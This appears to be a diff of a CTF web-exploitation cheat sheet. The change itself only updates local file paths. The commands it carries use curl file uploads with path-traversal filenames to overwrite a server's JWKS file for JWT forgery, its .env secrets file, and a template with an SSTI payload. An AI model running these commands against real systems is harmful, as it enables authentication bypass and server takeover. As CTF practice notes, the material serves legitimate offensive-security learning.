@@ -37,7 +37,7 @@ curl -s <target>/.well-known/jwks.json && echo "JWKS at root"
 #   /app/uploads/ -> /app/static/.well-known/jwks.json  = ../static/.well-known/jwks.json
 #   /app/uploads/ -> /static/.well-known/jwks.json      = ../../static/.well-known/jwks.json
 curl -si -X POST <target>/api/upload $AUTH_HEADER \
-  -F "file=@~/Tools/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"
+  -F "file=@~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"
 
 curl -s <target>/static/.well-known/jwks.json | python3 -m json.tool   # verify
 ```
@@ -46,11 +46,11 @@ Other high-value overwrite targets:
 ```bash
 # .env — DB creds / secrets read at runtime
 curl -si -X POST <target>/api/upload $AUTH_HEADER \
-  -F "file=@~/Tools/CTF/<challenge-name>/exploits/evil.env;filename=../.env"
+  -F "file=@~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.env;filename=../.env"
 
 # server-side template — overwrite with an SSTI payload
 curl -si -X POST <target>/api/upload $AUTH_HEADER \
-  -F "file=@~/Tools/CTF/<challenge-name>/exploits/evil.html;filename=../templates/index.html"
+  -F "file=@~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.html;filename=../templates/index.html"
 ```
 
 JWKS overwrite lands → go to `auth-jwt.md` § JWKS substitution.
